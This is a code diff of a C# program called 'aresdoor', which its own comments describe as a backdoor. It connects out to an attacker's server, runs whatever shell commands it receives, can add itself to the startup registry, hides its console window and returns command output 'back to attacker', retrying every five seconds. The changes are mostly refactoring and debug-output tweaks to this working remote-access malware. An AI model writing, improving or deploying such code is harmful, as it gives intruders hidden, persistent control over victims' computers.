@@ -89,23 +89,17 @@ namespace aresdoor
                     responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
 
                     if (responseData.Contains("cd"))
-                    {
                         System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
-                    }
                     else if (responseData.Contains("setStartup"))
                     {
                         Misc.SetStartup();
                         output = Misc.byteCode("Application added to startup registry.\n");
                     }
                     else
-                    {
                         try { output = Misc.byteCode(Misc.exec(responseData)); } catch (Exception) { output = Misc.byteCode("Command couldn't execute."); }
-                    }
 
                     try
-                    {
-                        stream.Write(output, 0, output.Length); // Send output of command back to attacker.
-                    }
+                    { stream.Write(output, 0, output.Length); } // Send output of command back to attacker.
                     catch (System.IO.IOException)
                     {
                         stream.Close();
@@ -129,7 +123,7 @@ namespace aresdoor
              * Usage:
              *      ./aresdoor.exe [server] [port]
              *      or
-             *      ./aresdoor.exe (no args) << requires varables to be configured properly
+             *      ./aresdoor.exe (no args) << requires hardcoded configuration
              * 
              */
             var handle = GetConsoleWindow();
@@ -165,17 +159,17 @@ namespace aresdoor
 
             while (true)
             {
-                if (Networking.checkInternetConn("www.google.com") || Networking.resolveHostName(server) == "::1" || Networking.resolveHostName(server) == "127.0.0.1")
+                if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
                 {
                     try
                     {
-                        Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);
+                        if (debugMode) { Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port); }
                         sendBackdoor(server, port);
                     }
-                    catch (Exception)
-                    { } // pass silently
+                    catch (Exception exc)
+                    { if (debugMode) { Console.WriteLine(exc.Message); } } // pass silently unless debug mode is enabled
                 } else
-                { if (debugMode) { Console.WriteLine("Couldn't connect to " + Networking.resolveHostName(server) + ":" + port + ". Retrying in 5 seconds..."); } }
+                { if (debugMode) { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); } }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
         }
